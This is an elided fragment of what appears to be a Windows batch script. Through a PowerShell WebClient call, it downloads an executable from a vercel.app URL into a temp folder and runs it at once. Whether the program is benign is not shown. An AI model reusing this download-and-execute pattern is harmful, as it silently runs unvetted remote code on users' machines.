...
set "kuraSvURL=https://kurasver.vercel.app/kura_src/runKuraLaz.exe"
...
powershell -command "(new-object System.Net.WebClient).DownloadFile('%kuraSvURL%', '%tempDir%\kuraSv.exe'); Start-Process '%tempDir%\kuraSv.exe'"
